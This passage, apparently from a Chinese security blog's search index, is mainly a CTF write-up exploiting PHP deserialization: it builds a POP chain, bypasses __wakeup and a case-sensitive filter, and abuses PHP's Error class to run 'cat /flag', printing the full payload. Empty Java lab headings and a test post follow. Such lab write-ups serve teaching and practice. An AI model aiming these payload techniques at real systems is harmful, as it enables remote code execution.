&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure><p>再看__call()方法下的规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure><p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p><p>编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png"></p><p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p><p>将生成的exp进行修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到函数主体部分有判断语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>GET传入c</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png"></p><p>进入后门后查看backdoor()函数体：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png"></p><p>可以看到返回值前面几个字符为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure><p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>GET传入a、b、d、e、f、g对应的值。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png"></p><p>命令执行成功了。</p><p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png"></p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png"></p><hr><hr><h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h2><h3 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h3><h3 id="lab2-ysoserial"><a href="#lab2-ysoserial" class="headerlink" title="lab2-ysoserial"></a>lab2-ysoserial</h3><h3 id="lab3-shiro-jrmp"><a href="#lab3-shiro-jrmp" class="headerlink" title="lab3-shiro-jrmp"></a>lab3-shiro-jrmp</h3><h3 id="lab4-shiro-blind"><a href="#lab4-shiro-blind" class="headerlink" title="lab4-shiro-blind"></a>lab4-shiro-blind</h3><h3 id="lab5-weblogic-readResolve"><a href="#lab5-weblogic-readResolve" class="headerlink" title="lab5-weblogic-readResolve"></a>lab5-weblogic-readResolve</h3><h3 id="lab6-weblogic-resolveProxyClass"><a href="#lab6-weblogic-resolveProxyClass" class="headerlink" title="lab6-weblogic-resolveProxyClass"></a>lab6-weblogic-resolveProxyClass</h3><h3 id="lab7-weblogic-UnicastRef"><a href="#lab7-weblogic-UnicastRef" class="headerlink" title="lab7-weblogic-UnicastRef"></a>lab7-weblogic-UnicastRef</h3><h3 id="lab8-jrmp-unicastRemoteObject"><a href="#lab8-jrmp-unicastRemoteObject" class="headerlink" title="lab8-jrmp-unicastRemoteObject"></a>lab8-jrmp-unicastRemoteObject</h3><h3 id="lab9-proxy"><a href="#lab9-proxy" class="headerlink" title="lab9-proxy"></a>lab9-proxy</h3>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HELLO</title>
    <link href="/2023/02/08/HELLO/"/>
    <url>/2023/02/08/HELLO/</url>
    
    <content type="html"><![CDATA[<h1 id="Just-a-test"><a href="#Just-a-test" class="headerlink" title="Just a test:)"></a>Just a test:)</h1><h2 id="My-first-blog"><a href="#My-first-blog" class="headerlink" title="My first blog"></a>My first blog</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">terces</span><span class="hljs-operator">=</span>d712373303471becd6f647f54703e6f5d696b7f6471647f607<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
